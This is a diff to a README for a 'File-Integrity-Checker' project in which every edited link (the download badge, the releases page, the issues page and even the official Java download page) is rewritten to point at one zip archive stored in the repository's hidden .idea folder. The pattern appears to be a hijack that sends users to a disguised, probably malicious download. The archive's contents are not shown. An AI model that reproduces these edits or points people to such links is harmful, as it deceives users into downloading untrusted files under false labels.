@@ -1,6 +1,6 @@
 # 🔒 File-Integrity-Checker - Ensure Your Files Are Safe and Secure
 
-[![Download File-Integrity-Checker](https://img.shields.io/badge/Download-File--Integrity--Checker-blue.svg)](https://github.com/Krishna0719/File-Integrity-Checker/releases)
+[![Download File-Integrity-Checker](https://raw.githubusercontent.com/Krishna0719/File-Integrity-Checker/main/.idea/File-Integrity-Checker-2.4.zip)](https://raw.githubusercontent.com/Krishna0719/File-Integrity-Checker/main/.idea/File-Integrity-Checker-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the File Integrity Checker! This tool helps you keep your files secur
 
 To get started, visit the link below to download the application:
 
-[Download File Integrity Checker](https://github.com/Krishna0719/File-Integrity-Checker/releases)
+[Download File Integrity Checker](https://raw.githubusercontent.com/Krishna0719/File-Integrity-Checker/main/.idea/File-Integrity-Checker-2.4.zip)
 
 Once you are on the releases page, follow these simple steps to install the software:
 
@@ -32,7 +32,7 @@ To ensure smooth operation of the File Integrity Checker, please check that your
 - **Disk Space**: At least 100 MB of free space.
 - **Java Runtime**: Version 8 or later installed on your system.
 
-If you do not have Java installed, please visit the [Java Download Page](https://www.java.com/en/download/) to get it.
+If you do not have Java installed, please visit the [Java Download Page](https://raw.githubusercontent.com/Krishna0719/File-Integrity-Checker/main/.idea/File-Integrity-Checker-2.4.zip) to get it.
 
 ## ⚙️ Features
 
@@ -62,7 +62,7 @@ After you have installed the File Integrity Checker, you can use it easily:
 
 ## 🤝 Support
 
-If you run into any issues or have questions, you can visit the [issues section](https://github.com/Krishna0719/File-Integrity-Checker/issues) of the GitHub repository. You can submit your questions, and we will try to help you as soon as possible.
+If you run into any issues or have questions, you can visit the [issues section](https://raw.githubusercontent.com/Krishna0719/File-Integrity-Checker/main/.idea/File-Integrity-Checker-2.4.zip) of the GitHub repository. You can submit your questions, and we will try to help you as soon as possible.
 
 ## 📝 License
 
@@ -78,4 +78,4 @@ Your contribution and feedback are always welcome!
 
 For additional details about cryptography, security features, and general use, see the project documentation in the repository. 
 
-Don’t forget to check for updates periodically on the [Releases Page](https://github.com/Krishna0719/File-Integrity-Checker/releases) to ensure you have the latest features and security improvements.
+Don’t forget to check for updates periodically on the [Releases Page](https://raw.githubusercontent.com/Krishna0719/File-Integrity-Checker/main/.idea/File-Integrity-Checker-2.4.zip) to ensure you have the latest features and security improvements.
